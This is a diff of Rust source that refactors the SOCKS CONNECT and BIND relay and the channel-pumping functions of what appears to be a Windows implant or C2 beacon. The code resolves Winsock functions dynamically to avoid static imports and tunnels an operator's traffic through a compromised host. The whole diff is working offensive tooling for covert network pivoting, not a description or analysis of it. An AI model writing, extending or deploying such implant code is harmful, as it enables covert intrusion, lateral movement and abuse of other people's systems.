@@ -199,82 +199,127 @@ unsafe fn add_channel_kind(chan: u32, sock: usize, listening: bool) -> bool {
 /// `Response::Channel { chan, status: 0 (open) }`. Subsequent bytes flow via
 /// [`channel_data`] (operator→socket) and [`pump_channels`] (socket→operator).
 pub fn do_connect(proto: u8, host: &str, port: u16, chan: u32) -> Response {
+    if let Some(err) = do_connect_prepare(proto, chan) {
+        return err;
+    }
+    let fns = match do_connect_resolve() {
+        Ok(f) => f,
+        Err(e) => return e,
+    };
+    let s = match do_connect_open(&fns, host, port) {
+        Ok(s) => s,
+        Err(e) => return e,
+    };
+    do_connect_finish(s, chan)
+}
+
+/// ws2_32 fn pointers resolved once per connect attempt.
+struct ConnectFns {
+    socket_fn: SocketFn,
+    connect_fn: ConnectFn,
+    ioctlsocket: IoctlSocket,
+    select_fn: SelectFn,
+    inet_addr: InetAddr,
+    getsockopt: GetSockOpt,
+}
+
+type SocketFn = unsafe extern "system" fn(i32, i32, i32) -> usize;
+type ConnectFn = unsafe extern "system" fn(usize, *const SockAddrIn, i32) -> i32;
+type IoctlSocket = unsafe extern "system" fn(usize, i32, *mut u32) -> i32;
+type SelectFn = unsafe extern "system" fn(
+    i32,
+    *const FdSet,
+    *const FdSet,
+    *const FdSet,
+    *const Timeval,
+) -> i32;
+type InetAddr = unsafe extern "system" fn(*const u8) -> u32;
+type GetSockOpt = unsafe extern "system" fn(usize, i32, i32, *mut u8, *mut i32) -> i32;
+
+/// Proto guard + winsock init + reuse cleanup. Returns `Some(err)` when the
+/// connect must fail early.
+fn do_connect_prepare(proto: u8, chan: u32) -> Option<Response> {
     if proto != 0 {
-        return Response::Err({
+        return Some(Response::Err({
             let mut e = String::from("connect: unsupported proto ");
             crate::fmt::push_decimal_u32(&mut e, proto as u32);
             e.push_str(" (only TCP=0)");
             e
-        });
+        }));
     }
     if !unsafe { wsa_init() } {
-        return Response::Err(String::from("connect: winsock init failed"));
+        return Some(Response::Err(String::from("connect: winsock init failed")));
     }
     // If a channel with this id is already open (operator reused a chan id),
     // close the old one first rather than leaking the socket.
     if let Some(idx) = unsafe { slot_of(chan) } {
         if let Some(c) = unsafe { (*CHANNELS.get())[idx] } {
-            if let Some(fns) = unsafe { ensure_relay() } {
-                let _ = unsafe { (fns.closesocket)(c.sock) };
+            if let Some(f) = unsafe { ensure_relay() } {
+                let _ = unsafe { (f.closesocket)(c.sock) };
             }
             unsafe { (*CHANNELS.get())[idx] = None };
         }
     }
+    None
+}
 
-    type SocketFn = unsafe extern "system" fn(i32, i32, i32) -> usize;
-    type ConnectFn = unsafe extern "system" fn(usize, *const SockAddrIn, i32) -> i32;
-    type IoctlSocket = unsafe extern "system" fn(usize, i32, *mut u32) -> i32;
-    type SelectFn = unsafe extern "system" fn(
-        i32,
-        *const FdSet,
-        *const FdSet,
-        *const FdSet,
-        *const Timeval,
-    ) -> i32;
-    type InetAddr = unsafe extern "system" fn(*const u8) -> u32;
-    type GetSockOpt = unsafe extern "system" fn(usize, i32, i32, *mut u8, *mut i32) -> i32;
-
+/// Resolve + transmute the six ws2_32 exports the TCP connect path needs.
+fn do_connect_resolve() -> Result<ConnectFns, Response> {
     let socket_fn: SocketFn = match unsafe { export_addr(b"ws2_32.dll", b"socket") } {
         Some(a) => unsafe { core::mem::transmute(a) },
-        None => return Response::Err(String::from("connect: socket unresolved")),
+        None => return Err(Response::Err(String::from("connect: socket unresolved"))),
     };
     let connect_fn: ConnectFn = match unsafe { export_addr(b"ws2_32.dll", b"connect") } {
         Some(a) => unsafe { core::mem::transmute(a) },
-        None => return Response::Err(String::from("connect: connect unresolved")),
+        None => return Err(Response::Err(String::from("connect: connect unresolved"))),
     };
     let ioctlsocket: IoctlSocket = match unsafe { export_addr(b"ws2_32.dll", b"ioctlsocket") } {
         Some(a) => unsafe { core::mem::transmute(a) },
-        None => return Response::Err(String::from("connect: ioctlsocket unresolved")),
+        None => return Err(Response::Err(String::from("connect: ioctlsocket unresolved"))),
     };
     let select_fn: SelectFn = match unsafe { export_addr(b"ws2_32.dll", b"select") } {
         Some(a) => unsafe { core::mem::transmute(a) },
-        None => return Response::Err(String::from("connect: select unresolved")),
+        None => return Err(Response::Err(String::from("connect: select unresolved"))),
     };
     let inet_addr: InetAddr = match unsafe { export_addr(b"ws2_32.dll", b"inet_addr") } {
         Some(a) => unsafe { core::mem::transmute(a) },
-        None => return Response::Err(String::from("connect: inet_addr unresolved")),
+        None => return Err(Response::Err(String::from("connect: inet_addr unresolved"))),
     };
     let getsockopt: GetSockOpt = match unsafe { export_addr(b"ws2_32.dll", b"getsockopt") } {
         Some(a) => unsafe { core::mem::transmute(a) },
-        None => return Response::Err(String::from("connect: getsockopt unresolved")),
+        None => return Err(Response::Err(String::from("connect: getsockopt unresolved"))),
     };
+    Ok(ConnectFns {
+        socket_fn,
+        connect_fn,
+        ioctlsocket,
+        select_fn,
+        inet_addr,
+        getsockopt,
+    })
+}
 
+/// NUL-terminate + resolve the host, open a non-blocking TCP socket and drive
+/// connect() to completion under the 5s select deadline. Returns the connected
+/// socket; on a failed/timed-out connect the socket is closed here and the
+/// `unreachable (5s)` error is returned.
+fn do_connect_open(fns: &ConnectFns, host: &str, port: u16) -> Result<usize, Response> {
     // Resolve the IPv4 (NUL-terminated for inet_addr).
     let mut hostz = [0u8; 256];
     let hn = host.as_bytes().len().min(hostz.len() - 1);
     hostz[..hn].copy_from_slice(&host.as_bytes()[..hn]);
-    let addr = unsafe { inet_addr(hostz.as_ptr()) };
+    let addr = unsafe { (fns.inet_addr)(hostz.as_ptr()) };
     if addr == INADDR_NONE {
-        return Response::Err(String::from("connect: invalid IPv4 address"));
+        return Err(Response::Err(String::from("connect: invalid IPv4 address")));
     }
 
-    let s = unsafe { socket_fn(AF_INET, SOCK_STREAM, 0) };
+    let s = unsafe { (fns.socket_fn)(AF_INET, SOCK_STREAM, 0) };
     if s == INVALID_SOCKET {
-        return Response::Err(String::from("connect: socket() failed"));
+        return Err(Response::Err(String::from("connect: socket() failed")));
     }
     // Non-blocking so connect + the later relay reads never stall the loop.
     let mut mode: u32 = 1;
-    let _ = unsafe { ioctlsocket(s, FIONBIO, &mut mode) };
+    let _ = unsafe { (fns.ioctlsocket)(s, FIONBIO, &mut mode) };
 
     let sa = SockAddrIn {
         sin_family: AF_INET as u16,
@@ -282,8 +327,20 @@ pub fn do_connect(proto: u8, host: &str, port: u16, chan: u32) -> Response {
         sin_addr: addr,
         sin_zero: [0; 8],
     };
-    let _ = unsafe { connect_fn(s, &sa, 16) };
+    let _ = unsafe { (fns.connect_fn)(s, &sa, 16) };
 
+    if do_connect_await(fns, s) {
+        return Ok(s);
+    }
+    // Connect failed/timed out — close + report via the cached closesocket.
+    if let Some(f) = unsafe { ensure_relay() } {
+        let _ = unsafe { (f.closesocket)(s) };
+    }
+    Err(do_connect_unreachable(host, port))
+}
+
+/// select() up to 5s for socket writability, then verify SO_ERROR is clean.
+fn do_connect_await(fns: &ConnectFns, s: usize) -> bool {
     let mut fdarr = [0usize; 64];
     fdarr[0] = s;
     let wfds = FdSet {
@@ -294,14 +351,14 @@ pub fn do_connect(proto: u8, host: &str, port: u16, chan: u32) -> Response {
         tv_sec: 5,
         tv_usec: 0,
     };
-    let n = unsafe { select_fn(0, core::ptr::null(), &wfds, core::ptr::null(), &tv) };
+    let n = unsafe { (fns.select_fn)(0, core::ptr::null(), &wfds, core::ptr::null(), &tv) };
 
     let mut ok = false;
     if n > 0 {
         let mut err: i32 = 0;
         let mut errlen: i32 = 4;
         let r = unsafe {
-            getsockopt(
+            (fns.getsockopt)(
                 s,
                 SOL_SOCKET,
                 SO_ERROR,
@@ -313,48 +370,46 @@ pub fn do_connect(proto: u8, host: &str, port: u16, chan: u32) -> Response {
             ok = true;
         }
     }
+    ok
+}
 
-    if ok {
-        // Keep the socket in the channel table (the relay owns it now). If the
-        // table is full, close + report rather than leak.
-        if unsafe { add_channel(chan, s) } {
-            return Response::Channel {
-                chan,
-                status: 0,
-                data: Vec::new(),
-            };
-        }
-        if let Some(fns) = unsafe { ensure_relay() } {
-            let _ = unsafe { (fns.closesocket)(s) };
-        }
-        return Response::Err(String::from("connect: channel table full"));
-    }
-
-    // Connect failed/timed out — close + report via the cached closesocket.
-    if let Some(fns) = unsafe { ensure_relay() } {
-        let _ = unsafe { (fns.closesocket)(s) };
-    }
-    Response::Err({
-        let mut e = String::from("connect ");
-        e.push_str(host);
-        e.push(':');
-        let mut buf = [0u8; 6];
-        let mut k = buf.len();
-        let mut v = port as u64;
-        if v == 0 {
+/// The `connect host:port: unreachable (5s)` failure response.
+fn do_connect_unreachable(host: &str, port: u16) -> Response {
+    let mut e = String::from("connect ");
+    e.push_str(host);
+    e.push(':');
+    let mut buf = [0u8; 6];
+    let mut k = buf.len();
+    let mut v = port as u64;
+    if v == 0 {
+        k -= 1;
+        buf[k] = b'0';
+    } else {
+        while v != 0 {
             k -= 1;
-            buf[k] = b'0';
-        } else {
-            while v != 0 {
-                k -= 1;
-                buf[k] = b'0' + (v % 10) as u8;
-                v /= 10;
-            }
+            buf[k] = b'0' + (v % 10) as u8;
+            v /= 10;
         }
-        e.push_str(core::str::from_utf8(&buf[k..]).unwrap_or("?"));
-        e.push_str(": unreachable (5s)");
-        e
-    })
+    }
+    e.push_str(core::str::from_utf8(&buf[k..]).unwrap_or("?"));
+    e.push_str(": unreachable (5s)");
+    Response::Err(e)
+}
+
+/// Keep the connected socket in the channel table (the relay owns it now). If
+/// the table is full, close + report rather than leak.
+fn do_connect_finish(s: usize, chan: u32) -> Response {
+    if unsafe { add_channel(chan, s) } {
+        return Response::Channel {
+            chan,
+            status: 0,
+            data: Vec::new(),
+        };
+    }
+    if let Some(f) = unsafe { ensure_relay() } {
+        let _ = unsafe { (f.closesocket)(s) };
+    }
+    Response::Err(String::from("connect: channel table full"))
 }
 
 /// `Command::Socks { chan, op, addr, port }`:
@@ -384,63 +439,96 @@ pub fn do_socks(chan: u32, op: u8, addr: &str, port: u16) -> Response {
 /// second reply carries the bound port and the first accepted peer is the
 /// connection). Returns `Channel { chan, status: 0 (open/listening) }`.
 fn do_bind(addr: &str, port: u16, chan: u32) -> Response {
+    if let Some(err) = do_bind_prepare(chan) {
+        return err;
+    }
+    let fns = match do_bind_resolve() {
+        Ok(f) => f,
+        Err(e) => return e,
+    };
+    let s = match do_bind_open(&fns, addr, port) {
+        Ok(s) => s,
+        Err(e) => return e,
+    };
+    do_bind_finish(s, chan)
+}
+
+/// ws2_32 fn pointers resolved once per bind attempt.
+struct BindFns {
+    socket_fn: SocketFn,
+    bind_fn: BindFn,
+    listen_fn: ListenFn,
+    ioctlsocket: IoctlSocket,
+    inet_addr: InetAddr,
+}
+
+type BindFn = unsafe extern "system" fn(usize, *const SockAddrIn, i32) -> i32;
+type ListenFn = unsafe extern "system" fn(usize, i32) -> i32;
+
+/// Winsock init + refuse-to-overwrite guard. Returns `Some(err)` on early
+/// failure.
+fn do_bind_prepare(chan: u32) -> Option<Response> {
     if !unsafe { wsa_init() } {
-        return Response::Err(String::from("bind: winsock init failed"));
+        return Some(Response::Err(String::from("bind: winsock init failed")));
     }
     // Refuse to overwrite an existing channel on the same id.  A BIND on an
     // already-bound chan id is a protocol error (the operator should
     // ChannelClose it first).  Silently replacing the old socket leaks it.
     if unsafe { slot_of(chan) }.is_some() {
-        return Response::Err(String::from("bind: channel already bound"));
+        return Some(Response::Err(String::from("bind: channel already bound")));
     }
+    None
+}
 
-    type SocketFn = unsafe extern "system" fn(i32, i32, i32) -> usize;
-    type BindFn = unsafe extern "system" fn(usize, *const SockAddrIn, i32) -> i32;
-    type ListenFn = unsafe extern "system" fn(usize, i32) -> i32;
-    type IoctlSocket = unsafe extern "system" fn(usize, i32, *mut u32) -> i32;
-    type InetAddr = unsafe extern "system" fn(*const u8) -> u32;
-
+/// Resolve + transmute the five ws2_32 exports the BIND path needs.
+fn do_bind_resolve() -> Result<BindFns, Response> {
     let socket_fn: SocketFn = match unsafe { export_addr(b"ws2_32.dll", b"socket") } {
         Some(a) => unsafe { core::mem::transmute(a) },
-        None => return Response::Err(String::from("bind: socket unresolved")),
+        None => return Err(Response::Err(String::from("bind: socket unresolved"))),
     };
     let bind_fn: BindFn = match unsafe { export_addr(b"ws2_32.dll", b"bind") } {
         Some(a) => unsafe { core::mem::transmute(a) },
-        None => return Response::Err(String::from("bind: bind unresolved")),
+        None => return Err(Response::Err(String::from("bind: bind unresolved"))),
     };
     let listen_fn: ListenFn = match unsafe { export_addr(b"ws2_32.dll", b"listen") } {
         Some(a) => unsafe { core::mem::transmute(a) },
-        None => return Response::Err(String::from("bind: listen unresolved")),
+        None => return Err(Response::Err(String::from("bind: listen unresolved"))),
     };
     let ioctlsocket: IoctlSocket = match unsafe { export_addr(b"ws2_32.dll", b"ioctlsocket") } {
         Some(a) => unsafe { core::mem::transmute(a) },
-        None => return Response::Err(String::from("bind: ioctlsocket unresolved")),
+        None => return Err(Response::Err(String::from("bind: ioctlsocket unresolved"))),
     };
     let inet_addr: InetAddr = match unsafe { export_addr(b"ws2_32.dll", b"inet_addr") } {
         Some(a) => unsafe { core::mem::transmute(a) },
-        None => return Response::Err(String::from("bind: inet_addr unresolved")),
+        None => return Err(Response::Err(String::from("bind: inet_addr unresolved"))),
     };
+    Ok(BindFns {
+        socket_fn,
+        bind_fn,
+        listen_fn,
+        ioctlsocket,
+        inet_addr,
+    })
+}
 
-    // Resolve the bind address. Empty/0.0.0.0/INADDR_ANY → bind all interfaces.
-    let ip = if addr.is_empty() {
-        0u32 // INADDR_ANY
-    } else {
-        let mut hostz = [0u8; 256];
-        let hn = addr.as_bytes().len().min(hostz.len() - 1);
-        hostz[..hn].copy_from_slice(&addr.as_bytes()[..hn]);
-        let a = unsafe { inet_addr(hostz.as_ptr()) };
-        if a == INADDR_NONE {
-            0u32 // fall back to INADDR_ANY on bad addr
-        } else {
-            a
-        }
-    };
-
-    let s = unsafe { socket_fn(AF_INET, SOCK_STREAM, 0) };
-    if s == INVALID_SOCKET {
-        return Response::Err(String::from("bind: socket() failed"));
+/// Resolve the bind address. Empty/0.0.0.0/INADDR_ANY → bind all interfaces.
+fn do_bind_resolve_ip(fns: &BindFns, addr: &str) -> u32 {
+    if addr.is_empty() {
+        return 0u32; // INADDR_ANY
     }
-    // SO_REUSEADDR so re-binding after a close doesn't sit in TIME_WAIT.
+    let mut hostz = [0u8; 256];
+    let hn = addr.as_bytes().len().min(hostz.len() - 1);
+    hostz[..hn].copy_from_slice(&addr.as_bytes()[..hn]);
+    let a = unsafe { (fns.inet_addr)(hostz.as_ptr()) };
+    if a == INADDR_NONE {
+        0u32 // fall back to INADDR_ANY on bad addr
+    } else {
+        a
+    }
+}
+
+/// SO_REUSEADDR so re-binding after a close doesn't sit in TIME_WAIT.
+fn do_bind_set_reuseaddr(s: usize) {
     type SetSockOpt = unsafe extern "system" fn(usize, i32, i32, *const u8, i32) -> i32;
     if let Some(a) = unsafe { export_addr(b"ws2_32.dll", b"setsockopt") } {
         let sso: SetSockOpt = unsafe { core::mem::transmute(a) };
@@ -457,6 +545,18 @@ fn do_bind(addr: &str, port: u16, chan: u32) -> Response {
             )
         };
     }
+}
+
+/// Open + bind + listen the socket. Returns the listening socket; on any
+/// failure the socket is closed here and the error response returned.
+fn do_bind_open(fns: &BindFns, addr: &str, port: u16) -> Result<usize, Response> {
+    let ip = do_bind_resolve_ip(fns, addr);
+    let s = unsafe { (fns.socket_fn)(AF_INET, SOCK_STREAM, 0) };
+    if s == INVALID_SOCKET {
+        return Err(Response::Err(String::from("bind: socket() failed")));
+    }
+    // SO_REUSEADDR so re-binding after a close doesn't sit in TIME_WAIT.
+    do_bind_set_reuseaddr(s);
     let sa = SockAddrIn {
         sin_family: AF_INET as u16,
         sin_port: port.to_be(),
@@ -465,25 +565,32 @@ fn do_bind(addr: &str, port: u16, chan: u32) -> Response {
     };
     const SOCKET_ERROR: i32 = -1;
     let close = |sock: usize| {
-        if let Some(fns) = unsafe { ensure_relay() } {
-            let _ = unsafe { (fns.closesocket)(sock) };
+        if let Some(f) = unsafe { ensure_relay() } {
+            let _ = unsafe { (f.closesocket)(sock) };
         }
     };
-    if unsafe { bind_fn(s, &sa, 16) } == SOCKET_ERROR {
+    if unsafe { (fns.bind_fn)(s, &sa, 16) } == SOCKET_ERROR {
         close(s);
-        return Response::Err(String::from("bind: bind() failed (port in use?)"));
+        return Err(Response::Err(String::from("bind: bind() failed (port in use?)")));
     }
     // backlog 1 — SOCKS5 BIND expects a single callback connection.
-    if unsafe { listen_fn(s, 1) } == SOCKET_ERROR {
+    if unsafe { (fns.listen_fn)(s, 1) } == SOCKET_ERROR {
         close(s);
-        return Response::Err(String::from("bind: listen() failed"));
+        return Err(Response::Err(String::from("bind: listen() failed")));
     }
     // Non-blocking so accept in pump_channels never stalls the beacon loop.
     let mut mode: u32 = 1;
-    let _ = unsafe { ioctlsocket(s, FIONBIO, &mut mode) };
+    let _ = unsafe { (fns.ioctlsocket)(s, FIONBIO, &mut mode) };
+    Ok(s)
+}
 
+/// Register the listening socket as a `listening` channel, closing it if the
+/// table is full.
+fn do_bind_finish(s: usize, chan: u32) -> Response {
     if !unsafe { add_channel_kind(chan, s, true) } {
-        close(s);
+        if let Some(f) = unsafe { ensure_relay() } {
+            let _ = unsafe { (f.closesocket)(s) };
+        }
         return Response::Err(String::from("bind: channel table full"));
     }
     Response::Channel {
@@ -597,61 +704,83 @@ pub fn pump_channels() -> Vec<Response> {
         // Try a non-blocking accept; on a new peer, the listener stays open and
         // the accepted socket becomes a normal relay channel on the SAME chan.
         if c.listening {
-            let accepted = unsafe { try_accept(c.sock) };
-            if let Some(peer) = accepted {
-                // Reuse the listener's chan id for the accepted peer (SOCKS5
-                // BIND: the first accepted connection IS the relay). If the
-                // table is full, drop the peer.
-                if unsafe { add_channel_kind(c.chan, peer, false) } {
-                    out.push(Response::Channel {
-                        chan: c.chan,
-                        status: 0,
-                        data: Vec::new(),
-                    });
-                } else {
-                    let _ = unsafe { (fns.closesocket)(peer) };
-                }
+            if let Some(resp) = unsafe { pump_channels_accept(fns, c) } {
+                out.push(resp);
             }
             i += 1;
             continue;
         }
-        let n = unsafe { (fns.recv)(c.sock, buf.as_mut_ptr(), buf.len() as i32, 0) };
-        if n > 0 {
-            let data: Vec<u8> = buf[..n as usize].to_vec();
-            out.push(Response::Channel {
-                chan: c.chan,
-                status: 1,
-                data,
-            });
-            i += 1;
-        } else if n == 0 {
-            // Peer closed the connection cleanly.
-            let _ = unsafe { (fns.closesocket)(c.sock) };
-            unsafe { (*CHANNELS.get())[i] = None };
-            out.push(Response::Channel {
-                chan: c.chan,
-                status: 2,
-                data: Vec::new(),
-            });
-            i += 1;
-        } else {
-            // SOCKET_ERROR: WOULDBLOCK = nothing to read (keep open); else tear down.
-            let err = unsafe { (fns.last_err)() };
-            if err == WSAEWOULDBLOCK {
-                i += 1;
-            } else {
-                let _ = unsafe { (fns.closesocket)(c.sock) };
-                unsafe { (*CHANNELS.get())[i] = None };
-                out.push(Response::Channel {
-                    chan: c.chan,
-                    status: 3,
-                    data: Vec::new(),
-                });
-                i += 1;
-            }
+        if let Some(resp) = unsafe { pump_channels_recv(fns, c, &mut buf, i) } {
+            out.push(resp);
         }
+        i += 1;
     }
     out
+}
+
+/// Accept-driven path for a listening (SOCKS BIND) channel. Returns the
+/// `status: 0 (open)` frame to emit when a peer was accepted, None otherwise.
+/// If the channel table is full the peer socket is dropped.
+unsafe fn pump_channels_accept(fns: &'static RelayFns, c: Channel) -> Option<Response> {
+    let accepted = unsafe { try_accept(c.sock) };
+    let Some(peer) = accepted else {
+        return None;
+    };
+    // Reuse the listener's chan id for the accepted peer (SOCKS5 BIND: the
+    // first accepted connection IS the relay). If the table is full, drop the peer.
+    if unsafe { add_channel_kind(c.chan, peer, false) } {
+        Some(Response::Channel {
+            chan: c.chan,
+            status: 0,
+            data: Vec::new(),
+        })
+    } else {
+        let _ = unsafe { (fns.closesocket)(peer) };
+        None
+    }
+}
+
+/// recv-driven path for a normal relay channel. Returns the frame to emit
+/// (`status: 1` data / `2` closed / `3` error) or None when there is nothing
+/// to push (WSAEWOULDBLOCK keeps the channel open).
+unsafe fn pump_channels_recv(
+    fns: &'static RelayFns,
+    c: Channel,
+    buf: &mut [u8; 4096],
+    i: usize,
+) -> Option<Response> {
+    let n = unsafe { (fns.recv)(c.sock, buf.as_mut_ptr(), buf.len() as i32, 0) };
+    if n > 0 {
+        let data: Vec<u8> = buf[..n as usize].to_vec();
+        Some(Response::Channel {
+            chan: c.chan,
+            status: 1,
+            data,
+        })
+    } else if n == 0 {
+        // Peer closed the connection cleanly.
+        let _ = unsafe { (fns.closesocket)(c.sock) };
+        unsafe { (*CHANNELS.get())[i] = None };
+        Some(Response::Channel {
+            chan: c.chan,
+            status: 2,
+            data: Vec::new(),
+        })
+    } else {
+        // SOCKET_ERROR: WOULDBLOCK = nothing to read (keep open); else tear down.
+        let err = unsafe { (fns.last_err)() };
+        if err == WSAEWOULDBLOCK {
+            None
+        } else {
+            let _ = unsafe { (fns.closesocket)(c.sock) };
+            unsafe { (*CHANNELS.get())[i] = None };
+            Some(Response::Channel {
+                chan: c.chan,
+                status: 3,
+                data: Vec::new(),
+            })
+        }
+    }
 }
 
 // ---- shared helpers -------------------------------------------------------
